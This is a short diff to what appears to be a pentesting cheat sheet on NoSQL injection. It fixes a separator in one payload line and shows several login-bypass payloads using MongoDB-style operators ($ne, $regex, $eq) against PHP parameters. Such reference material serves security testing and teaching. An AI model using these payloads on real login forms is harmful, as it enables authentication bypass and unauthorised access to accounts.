@@ -7,7 +7,7 @@ In PHP you can send an Array changing the sent parameter from _parameter=foo_ to
 The exploits are based in adding an **Operator**:
 
 ```bash
-username[$ne]=1$password[$ne]=1 #<Not Equals>
+username[$ne]=1&password[$ne]=1 #<Not Equals>
 username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
 username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
 username[$eq]=admin&password[$ne]=1 #<Equals>
